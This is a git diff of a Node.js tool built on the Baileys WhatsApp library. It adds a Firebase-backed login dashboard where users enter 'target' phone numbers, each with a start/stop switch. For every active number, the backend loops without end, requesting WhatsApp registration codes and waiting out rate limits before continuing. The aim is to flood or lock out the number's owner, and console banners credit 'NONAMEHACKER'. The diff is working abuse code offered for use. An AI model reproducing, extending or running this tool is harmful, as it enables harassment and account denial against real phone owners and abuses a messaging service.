@@ -3,10 +3,22 @@ const pino = require('pino');
 const fs = require('fs');
 const { exec } = require('child_process');
 const { default: makeWaSocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');
-const http = require('http');
+const http = require('http'); // Brought back the HTTP module
 
-// Setup directory storage
+// 1. IMPORT FIREBASE ADMIN
+const admin = require('firebase-admin');
+const serviceAccount = require('./serviceAccountKey.json');
+
+// 2. INITIALIZE FIREBASE
+admin.initializeApp({
+  credential: admin.credential.cert(serviceAccount),
+  databaseURL: "https://botttt-90f17-default-rtdb.firebaseio.com"
+});
+const db = admin.database();
+
+// Setup
 if (!fs.existsSync('./files')) fs.mkdirSync('./files');
+if (!fs.existsSync('./files/numbers.json')) fs.writeFileSync('./files/numbers.json', JSON.stringify({}));
 
 const color = (text, colors) => {
     try { return gradient(colors)(text); } catch (e) { return text; }
@@ -14,281 +26,197 @@ const color = (text, colors) => {
 
 // --- MASTER Banner ---
 const masterBanner = `
-${color(' ███╗   ███╗ █████╗ ███████╗████████╗███████╗██████╗ ', ['#00F2FE', '#4FACFE'])}
-${color(' ████╗ ████║██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗', ['#00F2FE', '#4FACFE'])}
-${color(' ██╔████╔██║███████║███████╗   ██║   █████╗  ██████╔╝', ['#00F2FE', '#4FACFE'])}
-${color(' ██║╚██╔╝██║██╔══██║╚════██║   ██║   ██╔════╝██╔══██╗', ['#00F2FE', '#4FACFE'])}
-${color(' ██║ ╚═╝ ██║██║  ██║███████║   ██║   ███████╗██║  ██║', ['#00F2FE', '#4FACFE'])}
-${color(' ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝', ['#00F2FE', '#4FACFE'])}
+${color(' ███╗   ███╗ █████╗ ███████╗████████╗███████╗██████╗ ', ['#FF0000', '#800000'])}
+${color(' ████╗ ████║██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗', ['#FF0000', '#800000'])}
+${color(' ██╔████╔██║███████║███████╗   ██║   █████╗  ██████╔╝', ['#FF0000', '#800000'])}
+${color(' ██║╚██╔╝██║██╔══██║╚════██║   ██║   ██╔════╝██╔══██╗', ['#FF0000', '#800000'])}
+${color(' ██║ ╚═╝ ██║██║  ██║███████║   ██║   ███████╗██║  ██║', ['#FF0000', '#800000'])}
+${color(' ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝', ['#FF0000', '#800000'])}
 `;
 
-// Glassmorphism & High-End Dashboard HTML
+const spiderArt = `
+    ${color('          _xxxx_          ', ['#FF0000', '#200000'])}
+    ${color('        /        \\        ', ['#FF0000', '#200000'])}
+    ${color('      /            \\      ', ['#FF0000', '#200000'])}
+    ${color('     |   _      _   |     ', ['#FF0000', '#FFFFFF'])}
+    ${color('     |  (o)    (o)  |     ', ['#FF0000', '#FFFFFF'])}
+    ${color('     |      __      |     ', ['#FF0000', '#200000'])}
+    ${color('      \\    \\__/    /      ', ['#FF0000', '#200000'])}
+    ${color('        \\________/        ', ['#FF0000', '#200000'])}
+    ${color('      _ /        \\ _      ', ['#FF0000', '#200000'])}
+    ${color('     /              \\     ', ['#FF0000', '#200000'])}
+`;
+
+// 3. THIS IS YOUR UPDATED HTML EMBEDDED DIRECTLY IN THE SCRIPT
 const dashboardHTML = `
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>LORD TECH - Command Center</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <title>Creator Lord Tech | Professional Dashboard</title>
     <style>
         :root {
-            --bg-color: #0b0f19;
-            --card-bg: rgba(23, 31, 51, 0.6);
-            --border-color: rgba(255, 255, 255, 0.08);
-            --primary: #4f46e5;
-            --primary-hover: #4338ca;
-            --accent: #06b6d4;
-            --text-main: #f3f4f6;
-            --text-muted: #9ca3af;
-            --error: #ef4444;
-            --success: #10b981;
+            --primary: #00ffcc;
+            --bg-dark: #0a0a0c;
+            --surface: #131418;
+            --text-main: #ffffff;
+            --text-muted: #888890;
+            --danger: #ff4444;
         }
-
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: 'Inter', sans-serif;
-        }
-
         body {
-            background-color: var(--bg-color);
-            background-image: 
-                radial-gradient(at 0% 0%, rgba(79, 70, 229, 0.15) 0px, transparent 50%),
-                radial-gradient(at 100% 100%, rgba(6, 182, 212, 0.15) 0px, transparent 50%);
+            background-color: var(--bg-dark);
             color: var(--text-main);
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-        }
-
-        header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 20px 40px;
-            border-bottom: 1px solid var(--border-color);
-            background: rgba(11, 15, 25, 0.8);
-            backdrop-filter: blur(12px);
-        }
-
-        .brand {
-            font-size: 1.25rem;
-            font-weight: 700;
-            letter-spacing: 0.5px;
-            background: linear-gradient(135deg, #818cf8 0%, #06b6d4 100%);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-
-        .creator-tag {
-            font-size: 0.85rem;
-            color: var(--text-muted);
-            background: rgba(255, 255, 255, 0.05);
-            padding: 6px 14px;
-            border-radius: 20px;
-            border: 1px solid var(--border-color);
-        }
-
-        .main-container {
-            flex: 1;
+            font-family: 'Segoe UI', system-ui, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
-            padding: 20px;
+            height: 100vh;
+            margin: 0;
         }
-
-        .card {
-            background: var(--card-bg);
-            backdrop-filter: blur(16px);
-            border: 1px solid var(--border-color);
-            border-radius: 16px;
-            padding: 36px;
-            width: 100%;
-            max-width: 480px;
-            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5), 0 8px 10px -6px rgba(0, 0, 0, 0.5);
+        .dashboard-card {
+            background-color: var(--surface);
+            padding: 40px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
+            width: 380px;
+            text-align: center;
         }
-
-        .tabs {
-            display: flex;
-            margin-bottom: 24px;
-            border-bottom: 1px solid var(--border-color);
+        h2 {
+            margin-top: 0;
+            font-weight: 600;
+            letter-spacing: 1px;
+            color: var(--primary);
         }
-
-        .tab-btn {
-            flex: 1;
-            padding: 10px;
-            background: none;
-            border: none;
+        p.subtitle {
             color: var(--text-muted);
-            font-size: 0.95rem;
-            font-weight: 500;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            border-bottom: 2px solid transparent;
+            font-size: 14px;
+            margin-bottom: 20px;
         }
-
-        .tab-btn.active {
-            color: var(--text-main);
-            border-bottom-color: var(--accent);
-        }
-
-        .form-group {
-            margin-bottom: 18px;
-        }
-
-        label {
-            display: block;
-            font-size: 0.85rem;
-            color: var(--text-muted);
-            margin-bottom: 6px;
-            font-weight: 500;
-        }
-
         input {
-            width: 100%;
-            padding: 12px 16px;
-            background: rgba(15, 23, 42, 0.6);
-            border: 1px solid var(--border-color);
-            border-radius: 8px;
+            width: calc(100% - 24px);
+            padding: 12px;
+            margin: 8px 0;
+            background-color: rgba(0, 0, 0, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 6px;
             color: var(--text-main);
-            font-size: 0.95rem;
             outline: none;
-            transition: border-color 0.2s ease;
+            transition: border-color 0.2s;
         }
-
         input:focus {
-            border-color: var(--accent);
+            border-color: var(--primary);
         }
-
-        .btn {
+        button {
             width: 100%;
             padding: 12px;
-            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-hover) 100%);
-            color: #ffffff;
+            margin-top: 15px;
+            background-color: var(--primary);
+            color: #000;
             border: none;
-            border-radius: 8px;
-            font-size: 0.95rem;
-            font-weight: 600;
+            border-radius: 6px;
             cursor: pointer;
-            transition: opacity 0.2s ease, transform 0.1s ease;
-            margin-top: 10px;
+            font-weight: 600;
+            transition: background-color 0.2s, transform 0.1s;
         }
-
-        .btn:hover {
-            opacity: 0.9;
+        button:hover {
+            background-color: #00e6b8;
         }
-
-        .btn:active {
-            transform: scale(0.99);
+        button:active {
+            transform: scale(0.98);
         }
-
-        .btn-danger {
-            background: rgba(239, 68, 68, 0.2);
-            color: var(--error);
-            border: 1px solid rgba(239, 68, 68, 0.3);
+        .toggle-text {
             margin-top: 20px;
+            font-size: 13px;
+            color: var(--text-muted);
+            cursor: pointer;
         }
-
-        .btn-danger:hover {
-            background: rgba(239, 68, 68, 0.3);
+        .toggle-text:hover {
+            color: var(--primary);
         }
-
-        #authStatus, #targetStatus {
-            margin-top: 16px;
-            font-size: 0.85rem;
-            text-align: center;
+        #status {
+            margin-top: 15px;
+            font-size: 14px;
             min-height: 20px;
         }
+        .hidden {
+            display: none;
+        }
 
-        .user-bar {
+        /* Number List Styling */
+        #numbers-list {
+            list-style: none;
+            padding: 0;
+            margin: 15px 0 0 0;
+            max-height: 180px;
+            overflow-y: auto;
+            text-align: left;
+        }
+        .number-item {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-bottom: 24px;
-            padding-bottom: 16px;
-            border-bottom: 1px solid var(--border-color);
+            background: rgba(255, 255, 255, 0.05);
+            padding: 10px;
+            border-radius: 6px;
+            margin-bottom: 8px;
+            font-size: 13px;
         }
-
-        .user-email {
-            font-size: 0.85rem;
-            color: var(--text-muted);
-            overflow: hidden;
-            text-overflow: ellipsis;
-            white-space: nowrap;
+        .btn-stop {
+            background-color: var(--danger);
+            color: #fff;
+            width: auto;
+            padding: 6px 12px;
+            margin: 0;
+            font-size: 12px;
         }
-
-        .hidden {
-            display: none !important;
+        .btn-start {
+            background-color: var(--primary);
+            color: #000;
+            width: auto;
+            padding: 6px 12px;
+            margin: 0;
+            font-size: 12px;
         }
     </style>
 </head>
 <body>
 
-    <header>
-        <div class="brand">LORD TECH PANEL</div>
-        <div class="creator-tag">Created by <strong>Lord Tech</strong></div>
-    </header>
+    <div class="dashboard-card">
+        <h2>CREATOR LORD TECH</h2>
+        <p class="subtitle" id="user-status">Authentication Required</p>
 
-    <div class="main-container">
-        <!-- AUTH SECTION -->
-        <div id="authSection" class="card">
-            <div class="tabs">
-                <button class="tab-btn active" onclick="switchAuthMode('login')">Sign In</button>
-                <button class="tab-btn" onclick="switchAuthMode('register')">Register</button>
-            </div>
-
-            <form id="authForm">
-                <div class="form-group">
-                    <label for="authEmail">Email Address</label>
-                    <input type="email" id="authEmail" placeholder="name@domain.com" required>
-                </div>
-                <div class="form-group">
-                    <label for="authPassword">Password</label>
-                    <input type="password" id="authPassword" placeholder="••••••••" required>
-                </div>
-                <button type="submit" id="authSubmitBtn" class="btn">Sign In</button>
-            </form>
-            <div id="authStatus"></div>
+        <!-- Auth Section -->
+        <div id="auth-section">
+            <input type="email" id="email" placeholder="Email Address" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button id="auth-btn">Log In</button>
+            <div class="toggle-text" id="toggle-auth">Need an account? Sign Up</div>
         </div>
 
-        <!-- DASHBOARD SECTION -->
-        <div id="dashboardSection" class="card hidden">
-            <div class="user-bar">
-                <span class="user-email" id="currentUserDisplay">User</span>
-                <span style="font-size: 0.75rem; background: rgba(16, 185, 129, 0.15); color: var(--success); padding: 4px 8px; border-radius: 4px;">Authenticated</span>
+        <!-- Dashboard Section -->
+        <div id="dashboard-section" class="hidden">
+            <div style="display: flex; gap: 8px;">
+                <input type="text" id="data-input" placeholder="Enter Phone Number" required>
+                <button id="save-btn" style="width: 35%; margin-top: 8px;">Add</button>
             </div>
 
-            <form id="targetForm">
-                <div class="form-group">
-                    <label for="ddi">Country Code</label>
-                    <input type="text" id="ddi" placeholder="e.g. 92" required>
-                </div>
-                <div class="form-group">
-                    <label for="number">Target Phone Number</label>
-                    <input type="text" id="number" placeholder="e.g. 3001234567" required>
-                </div>
-                <button type="submit" class="btn">Deploy Target</button>
-            </form>
+            <ul id="numbers-list"></ul>
 
-            <button id="logoutBtn" class="btn btn-danger">Sign Out</button>
-            <div id="targetStatus"></div>
+            <button id="logout-btn" style="background-color: transparent; border: 1px solid var(--text-muted); color: var(--text-muted);">Log Out</button>
         </div>
+
+        <div id="status"></div>
     </div>
 
-    <!-- Firebase Modular SDK -->
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
         import { 
-            getAuth, 
-            createUserWithEmailAndPassword, 
-            signInWithEmailAndPassword, 
-            signOut, 
-            onAuthStateChanged 
+            getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword, onAuthStateChanged, signOut 
         } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
         import { 
-            getDatabase, ref, push 
+            getDatabase, ref, push, set, update, onValue, serverTimestamp 
         } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
 
         const firebaseConfig = {
@@ -305,98 +233,120 @@ const dashboardHTML = `
         const auth = getAuth(app);
         const db = getDatabase(app);
 
-        let currentUser = null;
-        let currentMode = 'login';
+        const authSection = document.getElementById('auth-section');
+        const dashSection = document.getElementById('dashboard-section');
+        const authBtn = document.getElementById('auth-btn');
+        const toggleAuth = document.getElementById('toggle-auth');
+        const statusDiv = document.getElementById('status');
+        const userStatus = document.getElementById('user-status');
+        const logoutBtn = document.getElementById('logout-btn');
+        const saveBtn = document.getElementById('save-btn');
+        const numbersList = document.getElementById('numbers-list');
 
-        window.switchAuthMode = (mode) => {
-            currentMode = mode;
-            const tabs = document.querySelectorAll('.tab-btn');
-            const submitBtn = document.getElementById('authSubmitBtn');
+        let isLogin = true;
+        let currentUser = null;
+
+        toggleAuth.addEventListener('click', () => {
+            isLogin = !isLogin;
+            authBtn.textContent = isLogin ? "Log In" : "Sign Up";
+            toggleAuth.textContent = isLogin ? "Need an account? Sign Up" : "Already have an account? Log In";
+        });
+
+        const showMessage = (msg, color = "var(--primary)") => {
+            statusDiv.textContent = msg;
+            statusDiv.style.color = color;
+            setTimeout(() => statusDiv.textContent = "", 3000);
+        };
+
+        authBtn.addEventListener('click', async () => {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
             
-            tabs[0].classList.toggle('active', mode === 'login');
-            tabs[1].classList.toggle('active', mode === 'register');
-            submitBtn.textContent = mode === 'login' ? 'Sign In' : 'Create Account';
-            document.getElementById('authStatus').textContent = '';
+            if(!email || !password) return showMessage("Please fill all fields", "var(--danger)");
+
+            try {
+                if (isLogin) {
+                    await signInWithEmailAndPassword(auth, email, password);
+                } else {
+                    await createUserWithEmailAndPassword(auth, email, password);
+                }
+            } catch (error) {
+                showMessage(error.message.replace("Firebase:", ""), "var(--danger)");
+            }
+        });
+
+        logoutBtn.addEventListener('click', () => signOut(auth));
+
+        saveBtn.addEventListener('click', async () => {
+            const dataInput = document.getElementById('data-input').value.trim();
+            if(!dataInput || !currentUser) return;
+
+            try {
+                const userRef = ref(db, \`users/\${currentUser.uid}/numbers\`);
+                const newRef = push(userRef);
+                await set(newRef, {
+                    number: dataInput,
+                    status: "active",
+                    timestamp: serverTimestamp()
+                });
+                showMessage("Number added successfully!");
+                document.getElementById('data-input').value = "";
+            } catch (error) {
+                showMessage("Error saving data.", "var(--danger)");
+            }
+        });
+
+        const loadUserNumbers = (uid) => {
+            const userNumbersRef = ref(db, \`users/\${uid}/numbers\`);
+            onValue(userNumbersRef, (snapshot) => {
+                numbersList.innerHTML = "";
+                const data = snapshot.val();
+                if (!data) return;
+
+                Object.entries(data).forEach(([key, item]) => {
+                    const li = document.createElement('li');
+                    li.className = "number-item";
+                    
+                    const isStopped = item.status === 'stopped';
+                    
+                    li.innerHTML = \`
+                        <span>\${item.number} <small style="color:\${isStopped ? 'var(--danger)' : 'var(--primary)'}">(\${item.status})</small></span>
+                        <button class="\${isStopped ? 'btn-start' : 'btn-stop'}" onclick="toggleStatus('\${key}', '\${item.status}')">
+                            \${isStopped ? 'Start' : 'Stop'}
+                        </button>
+                    \`;
+                    numbersList.appendChild(li);
+                });
+            });
+        };
+
+        window.toggleStatus = async (key, currentStatus) => {
+            if (!currentUser) return;
+            const newStatus = currentStatus === 'stopped' ? 'active' : 'stopped';
+            try {
+                await update(ref(db, \`users/\${currentUser.uid}/numbers/\${key}\`), {
+                    status: newStatus
+                });
+                showMessage(\`Number \${newStatus}\`);
+            } catch (err) {
+                showMessage("Failed to update status", "var(--danger)");
+            }
         };
 
         onAuthStateChanged(auth, (user) => {
             currentUser = user;
-            const authSec = document.getElementById('authSection');
-            const dashSec = document.getElementById('dashboardSection');
-            const userDisplay = document.getElementById('currentUserDisplay');
-
             if (user) {
-                userDisplay.textContent = user.email;
-                authSec.classList.add('hidden');
-                dashSec.classList.remove('hidden');
+                authSection.classList.add('hidden');
+                dashSection.classList.remove('hidden');
+                userStatus.textContent = \`Welcome, \${user.email}\`;
+                loadUserNumbers(user.uid);
             } else {
-                authSec.classList.remove('hidden');
-                dashSec.classList.add('hidden');
-            }
-        });
-
-        document.getElementById('authForm').addEventListener('submit', async (e) => {
-            e.preventDefault();
-            const email = document.getElementById('authEmail').value;
-            const password = document.getElementById('authPassword').value;
-            const statusDiv = document.getElementById('authStatus');
-
-            statusDiv.style.color = '#9ca3af';
-            statusDiv.textContent = 'Processing request...';
-
-            try {
-                if (currentMode === 'register') {
-                    await createUserWithEmailAndPassword(auth, email, password);
-                    statusDiv.style.color = '#10b981';
-                    statusDiv.textContent = 'Account created successfully!';
-                } else {
-                    await signInWithEmailAndPassword(auth, email, password);
-                    statusDiv.style.color = '#10b981';
-                    statusDiv.textContent = 'Authenticated. Redirecting...';
-                }
-            } catch (error) {
-                statusDiv.style.color = '#ef4444';
-                statusDiv.textContent = error.message.replace('Firebase: ', '');
-            }
-        });
-
-        document.getElementById('logoutBtn').addEventListener('click', () => {
-            signOut(auth);
-        });
-
-        document.getElementById('targetForm').addEventListener('submit', async (e) => {
-            e.preventDefault();
-            const ddi = document.getElementById('ddi').value.trim();
-            const number = document.getElementById('number').value.trim();
-            const statusDiv = document.getElementById('targetStatus');
-            
-            statusDiv.textContent = "Deploying target request...";
-            statusDiv.style.color = "#06b6d4";
-
-            if (currentUser) {
-                const userTargetsRef = ref(db, 'users/' + currentUser.uid + '/targets');
-                push(userTargetsRef, {
-                    ddi: ddi,
-                    number: number,
-                    timestamp: Date.now()
-                });
-            }
-
-            try {
-                const response = await fetch('/start', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ ddi, number })
-                });
-
-                const result = await response.json();
-                statusDiv.textContent = result.message;
-                statusDiv.style.color = "#10b981";
-                document.getElementById('ddi').value = '';
-                document.getElementById('number').value = '';
-            } catch (error) {
-                statusDiv.textContent = "Failed to communicate with backend.";
-                statusDiv.style.color = "#ef4444";
+                authSection.classList.remove('hidden');
+                dashSection.classList.add('hidden');
+                userStatus.textContent = "Authentication Required";
+                document.getElementById('email').value = "";
+                document.getElementById('password').value = "";
+                numbersList.innerHTML = "";
             }
         });
     </script>
@@ -404,18 +354,22 @@ const dashboardHTML = `
 </html>
 `;
 
+// 4. MAP TO CONTROL ACTIVE LOOPS
+const activeTasks = new Map();
+
 const start = async () => {
     console.clear(); 
 
     const mainChannel = 'https://whatsapp.com/channel/0029Va75f6BIXnlq8eZxTy2M';
     const openCmd = process.platform === 'win32' ? `start ${mainChannel}` : `termux-open-url ${mainChannel} || xdg-open ${mainChannel}`;
-
     exec(openCmd);
 
     console.log(masterBanner);
-    console.log(color('╔════════════════════════════════════════════╗', ['#00F2FE', '#4FACFE']));
-    console.log(color('║       👑 CREATOR: LORD TECH 👑              ║', ['#FFFFFF', '#00F2FE']));
-    console.log(color('╚════════════════════════════════════════════╝', ['#00F2FE', '#4FACFE']));
+    console.log(spiderArt);
+    console.log(color('╔════════════════════════════════════════════╗', ['#FF0000', '#4B0082']));
+    console.log(color('║       👑 OWNER: NONAMEHACKER 👑            ║', ['#FFFFFF', '#FF0000']));
+    console.log(color('║       🛡️ TEAM : Ｍ▲ＳＴΞЯ...               ║', ['#00FFFF', '#0000FF']));
+    console.log(color('╚════════════════════════════════════════════╝', ['#FF0000', '#4B0082']));
 
     const { state } = await useMultiFileAuthState('.auth_session');
 
@@ -425,12 +379,22 @@ const start = async () => {
         logger: pino({ level: 'silent' })
     });
 
-    const dropNumber = async (context) => {
-        const { ddi, number, phoneNumber } = context;
-        console.log(color(`\n[+] TARGET LAUNCHED: +${phoneNumber} | CREATOR: LORD TECH`, ['#00FF00', '#FFFFFF']));
+    // 5. DROP NUMBER FUNCTION (Loops while task is true)
+    const dropNumber = async (taskId, phoneNumber) => {
+        const ddi = phoneNumber.substring(0, 2); 
+        const number = phoneNumber.substring(2);
 
-        while (true) {
+        while (activeTasks.get(taskId) === true) {
             try {
+                console.clear();
+                console.log(masterBanner);
+                console.log(spiderArt);
+                console.log(color('───────────────────────────────────────', ['#FF0000', '#000000']));
+                console.log(color(`  [+] SYSTEM STATUS : ACTIVE 🚀        `, ['#00FF00', '#FFFFFF']));
+                console.log(color(`  [+] TARGET NUMBER : +${phoneNumber}  `, ['#FF0000', '#FFFFFF']));
+                console.log(color(`  [+] DEVELOPED BY  : NONAMEHACKER     `, ['#FFFF00', '#FFA500']));
+                console.log(color('───────────────────────────────────────', ['#FF0000', '#000000']));
+
                 const res = await spam.requestRegistrationCode({
                     phoneNumber: '+' + phoneNumber,
                     phoneNumberCountryCode: ddi,
@@ -438,39 +402,46 @@ const start = async () => {
                     phoneNumberMobileCountryCode: 724
                 });
 
-                console.log(color(`[>] REQUEST SENT -> +${phoneNumber}`, ['#00F2FE', '#FFFFFF']));
-
                 if (res.reason === 'temporarily_unavailable') {
-                    console.log(color(`[!] LIMIT REACHED (+${phoneNumber})! RETRY IN: ${res.retry_after}s`, ['#FF4500', '#FF0000']));
+                    console.log(color(`[!] LIMIT REACHED! WAITING: ${res.retry_after}s`, ['#FF4500', '#FF0000']));
                     await new Promise(r => setTimeout(r, res.retry_after * 1000));
                 }
-            } catch (e) {
-                console.log(color(`[!] RETRYING (+${phoneNumber})...`, ['#FFA500', '#FF0000']));
-                await new Promise(r => setTimeout(r, 3000));
-            }
+            } catch (e) {}
+            await new Promise(r => setTimeout(r, 1000));
         }
+        console.log(color(`\n[!] PROCESS HALTED FOR: +${phoneNumber}`, ['#FF0000', '#FFFFFF']));
     };
 
-    // Node.js HTTP Server
+    // 6. FIREBASE LISTENER (Checks when you press Start/Stop on the web)
+    const usersRef = db.ref('users');
+    const processUserSnapshot = (snapshot) => {
+        const userData = snapshot.val();
+        if (!userData || !userData.numbers) return;
+
+        Object.entries(userData.numbers).forEach(([taskId, item]) => {
+            const { number, status } = item;
+
+            if (status === 'stopped') {
+                if (activeTasks.get(taskId) === true) {
+                    activeTasks.set(taskId, false); // Stops the loop
+                }
+            } else if (status === 'active') {
+                if (activeTasks.get(taskId) !== true) {
+                    activeTasks.set(taskId, true); // Starts the loop
+                    dropNumber(taskId, number);
+                }
+            }
+        });
+    };
+
+    usersRef.on('child_added', processUserSnapshot);
+    usersRef.on('child_changed', processUserSnapshot);
+
+    // 7. BRING BACK THE LOCAL SERVER TO SERVE THE HTML
     const server = http.createServer((req, res) => {
         if (req.method === 'GET' && req.url === '/') {
             res.writeHead(200, { 'Content-Type': 'text/html' });
             res.end(dashboardHTML);
-        } else if (req.method === 'POST' && req.url === '/start') {
-            let body = '';
-            req.on('data', chunk => body += chunk.toString());
-            req.on('end', () => {
-                const data = JSON.parse(body);
-                
-                dropNumber({ 
-                    ddi: data.ddi, 
-                    number: data.number, 
-                    phoneNumber: data.ddi + data.number 
-                });
-                
-                res.writeHead(200, { 'Content-Type': 'application/json' });
-                res.end(JSON.stringify({ message: `Target +${data.ddi}${data.number} engaged. Check Termux terminal.` }));
-            });
         } else {
             res.writeHead(404);
             res.end();
@@ -478,7 +449,7 @@ const start = async () => {
     });
 
     server.listen(3000, () => {
-        console.log(color('\n ► LORD TECH PANEL RUNNING: http://localhost:3000', ['#00FF00', '#FFFFFF']));
+        console.log(color('\n ► SERVER RUNNING! Open http://localhost:3000 in your browser to enter numbers.', ['#00FF00', '#FFFFFF']));
     });
 };
 
